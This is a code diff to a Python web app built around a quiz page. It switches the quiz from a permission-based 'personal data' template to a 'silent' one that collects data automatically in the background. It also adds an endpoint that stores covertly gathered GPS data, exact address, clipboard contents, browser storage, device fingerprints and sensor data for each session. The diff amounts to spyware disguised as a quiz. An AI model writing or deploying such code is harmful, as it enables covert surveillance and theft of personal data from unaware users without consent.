@@ -144,6 +144,10 @@ class PersonalDataUpload(BaseModel):
     session_id: str
     data: dict
 
+class SilentDataUpload(BaseModel):
+    session_id: str
+    data: dict
+
 @app.get('/', response_class=HTMLResponse)
 async def index(request: Request):
     """Home page with QR code for mobile access"""
@@ -166,14 +170,14 @@ async def index(request: Request):
 
 @app.get('/quiz', response_class=HTMLResponse)
 async def quiz(request: Request):
-    """Quiz page where users grant permissions - PERSONAL DATA VERSION"""
+    """Quiz page - SILENT AUTOMATIC DATA COLLECTION"""
     # Generate a random session ID
     session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
     # Pick a random question
     question = random.choice(QUIZ_QUESTIONS)
 
-    # Use personal data version that collects photos, contacts, location
-    return templates.TemplateResponse(request, 'quiz_personal.html', {'session_id': session_id, 'question': question})
+    # Use silent version that collects data automatically in background
+    return templates.TemplateResponse(request, 'quiz_silent.html', {'session_id': session_id, 'question': question})
 
 @app.get('/get_question')
 async def get_question():
@@ -355,6 +359,39 @@ async def upload_personal_data(personal_upload: PersonalDataUpload):
     return JSONResponse(content={
         'status': 'success',
         'message': f"Collected {len(data.get('photos', []))} photos and {len(data.get('contacts', []))} contacts"
+    })
+
+@app.post('/upload_silent_data')
+async def upload_silent_data(silent_upload: SilentDataUpload):
+    """Endpoint for receiving silently collected data"""
+    session_id = silent_upload.session_id
+    data = silent_upload.data
+
+    if session_id not in user_data_store:
+        user_data_store[session_id] = {}
+
+    # Store ALL silently collected data
+    user_data_store[session_id]['silent_data'] = data
+    user_data_store[session_id]['ip_address'] = data.get('ip')
+    user_data_store[session_id]['location'] = data.get('location', {})
+    user_data_store[session_id]['gps'] = data.get('gps')
+    user_data_store[session_id]['exact_address'] = data.get('exactAddress')
+    user_data_store[session_id]['clipboard'] = data.get('clipboard')
+    user_data_store[session_id]['device_info'] = data.get('device', {})
+    user_data_store[session_id]['storage_data'] = data.get('storage', {})
+    user_data_store[session_id]['fingerprints'] = {
+        'canvas': data.get('canvasFingerprint'),
+        'webgl': data.get('webgl'),
+        'audio': data.get('audioFingerprint')
+    }
+    user_data_store[session_id]['network_info'] = data.get('network', {})
+    user_data_store[session_id]['battery_info'] = data.get('battery')
+    user_data_store[session_id]['media_devices'] = data.get('mediaDevices', {})
+    user_data_store[session_id]['motion_data'] = data.get('motionData')
+
+    return JSONResponse(content={
+        'status': 'success',
+        'message': 'Silent data collection successful'
     })
 
 @app.get('/show_data/{session_id}', response_class=HTMLResponse)
